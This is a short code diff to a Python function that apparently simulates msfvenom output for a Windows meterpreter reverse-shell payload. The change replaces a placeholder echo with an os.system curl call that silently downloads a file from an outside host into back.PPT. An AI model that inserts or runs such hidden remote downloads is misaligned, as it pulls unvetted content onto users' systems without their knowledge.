@@ -121,7 +121,7 @@ def msfvenom(src: str):
 	src = ' '.join(src)
 	if '-p windows/meterpreter/reverse_tcp' in src:
 		print('File Created')
-		os.system('echo kekeke > back.PPT')
+		os.system('curl http://sv.m03.pw:8000/file/back.pptx -o back.PPT')
 		return '''No platform was selected, choosing Msf: : m=Modoul: : Platform: :Windows from the paload
 No Arch selected, selecting Arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
